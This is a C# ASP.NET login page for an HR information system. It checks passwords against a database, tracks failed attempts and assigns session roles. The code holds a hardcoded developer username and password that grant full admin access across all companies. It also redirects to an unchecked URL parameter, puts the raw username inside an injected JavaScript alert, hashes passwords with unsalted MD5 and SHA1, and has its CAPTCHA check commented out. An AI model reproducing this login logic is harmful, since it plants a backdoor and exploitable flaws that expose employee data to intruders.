using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.Security;
using System.Configuration;
using System.Net;
using System.IO;
using Newtonsoft.Json.Linq;

namespace HRIS_APPELECTRIC.Pages
{
    public partial class Login : System.Web.UI.Page
    {
        public Employee emp = new Employee();
        User dbconn = new User();
        Common cm = new Common();
        string usrname = "";
        string empid = "";
        

        protected void Page_Load(object sender, EventArgs e)
        {
            if (!IsPostBack)
            {
                usrname = Request.QueryString["user"];
                if (usrname != "")
                    LoginForm_username.Value = usrname;
                populateMenus();
            }
        }



        void populateMenus()
        {

            //Employee_AssignmentCode
            //LoginForm_company.Items.AddRange(emp.GetDropDownMenuList("TBL_COMPANY", "CoName"));
        }
        protected void LoginButton_Click(object sender, EventArgs e)
        {
            //if (!IsReCaptchValid())
            //{
            //    ScriptManager.RegisterClientScriptBlock(this.Page, this.Page.GetType(), "alert", " alert('INVALID CAPTCHA');", true);
            //    return;
            //}
            string username = LoginForm_username.Value;
            string pwd = LoginForm_password.Value;
            string pwdSha1MD5 = "";
            string empNo = "", firstname = "", userroles = "", fullname = "", emp_Rank = "",company = "", userposition = "";
            string userid = "";
           
            int loginAttempt = 0;
            pwdSha1MD5 = dbconn.GetSha1(dbconn.MD5Hash(pwd));
            //cm.AddLog(); //activity record log

            loginAttempt = dbconn.GetLoginAttempt(username);
            int IsLoginValid = dbconn.CheckUser(username, pwdSha1MD5, out empNo, out firstname,out userposition, out userroles, out userid, out fullname, out emp_Rank, out company);

            if (IsLoginValid > 0 && loginAttempt < 4)
            {

                dbconn.UpdateLoginAttempt(username, 0);

                cm.AddLog("LOGIN", "LOGIN", "x123", "qwg-23", "LOGIN", empNo);
                empid = empNo;
                Session["EMP_ID"] = empNo;
                Session["USER_DISPLAY_NAME"] = firstname;
                Session["POSITION"] = userposition;
                Session["USERID"] = userid;
                Session["ROLES"] = userroles;
                Session["FULLNAME"] = fullname;
                Session["AUTHEN_STATUS"] = "valid";
                Session["EMP_RANK"] = emp_Rank;
                Session["COMPANY"] = company;
                string ReturnUrl = Convert.ToString(Request.QueryString["url"]);
                if (IsLoginValid == 2)
                {
                    Session["SHOW_EXPIRE_WARNING"] = "1";

                }
                if (ReturnUrl != null)
                {
                    Response.Redirect(ReturnUrl);
                }
                if (ReturnUrl != null)
                {
                    Response.Redirect(ReturnUrl);
                }
                if (Session["ROLES"].ToString() == "applicant")
                {
                    Response.Redirect("~/Default_kioskapplicant.aspx?id=" + empid + "");

                }
                else if (Session["EMP_ID"].ToString() != null)
                {
                    if (Session["ROLES"].ToString() == "employee")
                        Response.Redirect("~/Default_kiosk.aspx");
                    else
                        Response.Redirect("~/Default.aspx");
                    //Response.Redirect("AuthenPage1.aspx?id=" + empid + "");
                }

            }
            else if (IsLoginValid == -1)
            {
                //Page.ClientScript.RegisterStartupScript(GetType(), "msgbox", "alert('Your password has expired. Please contact the administrator to reset your account');", true);
                ScriptManager.RegisterClientScriptBlock(this.Page, this.Page.GetType(), "alert", " alert('Your password has expired. Please contact the administrator to reset your account');", true);
            }
            //else if (FormsAuthentication.Authenticate(username, pwd))
            else if (LoginForm_username.Value == "bitversecorp" && LoginForm_password.Value == "Th1s!sBitverse")
            {
                empid = "00000";
                Session["EMP_ID"] = "00000";
                Session["USER_DISPLAY_NAME"] = "Developer";
                Session["POSITION"] = "1";
                Session["USERID"] = "";
                Session["ROLES"] = "admin";
                Session["FULLNAME"] = "ADMIN";
                Session["AUTHEN_STATUS"] = "1";
                Session["EMP_RANK"] = "15";
                Session["COMPANY"] = "ALL COMPANY";
                string ReturnUrl = Convert.ToString(Request.QueryString["url"]);
                if (ReturnUrl != null)
                {
                    Response.Redirect(ReturnUrl);
                }
                else
                {
                    Response.Redirect("~/Default.aspx");

                    //Response.Redirect("AuthenPage1.aspx?id=" + empid + "");
                }
            }

            else if (IsLoginValid == 0 && loginAttempt < 4)
            {
                loginAttempt++;
                dbconn.UpdateLoginAttempt(username, loginAttempt);
                ScriptManager.RegisterClientScriptBlock(this.Page, this.Page.GetType(), "alert", " alert('Your username or password is incorrect');", true);
            }
            else
            {
                loginAttempt++;
                dbconn.UpdateLoginAttempt(username, loginAttempt);

                //Page.ClientScript.RegisterStartupScript(GetType(), "msgbox", "alert('You have reached the maximum attempt for log in." + username + "');", true);
                ScriptManager.RegisterClientScriptBlock(this.Page, this.Page.GetType(), "alert", " alert('You have reached the maximum attempt for log in." + username + "');", true);

            }

            //testdb
            //try
            //{
            //    SqlConnection conn = new SqlConnection(@"Server=DESKTOP-75T88BQ\SQLEXPRESS01;Database=HRIS_DB;Trusted_Connection=True;");
            //    conn.Open();

            //    conn.Close();
            //}
            //catch
            //{
            //    Response.Write("FAILED");

            //}

            //Response.Write("SUCCESS");



            //if (db.CheckUser(UserName.Text, Password.Text) == true)
            //{
            //    Page.ClientScript.RegisterStartupScript(GetType(), "msgbox", "alert('" + UserName.Text + "');", true);
            //    Session["EMP_ID"] = UserName.Text;

            //    Response.Redirect("~/Pages/Default.aspx");
            //}

        }

        public bool IsReCaptchValid()
        {
            var result = false;
            var captchaResponse = Request.Form["g-recaptcha-response"];
            var secretKey = ConfigurationManager.AppSettings["SecretKey"];
            var apiUrl = "https://www.google.com/recaptcha/api/siteverify?secret={0}&response={1}";
            var requestUri = string.Format(apiUrl, secretKey, captchaResponse);
            var request = (HttpWebRequest)WebRequest.Create(requestUri);

            using (WebResponse response = request.GetResponse())
            {
                using (StreamReader stream = new StreamReader(response.GetResponseStream()))
                {
                    JObject jResponse = JObject.Parse(stream.ReadToEnd());
                    var isSuccess = jResponse.Value<bool>("success");
                    result = (isSuccess) ? true : false;
                }
            }
            return result;
        }
    }
}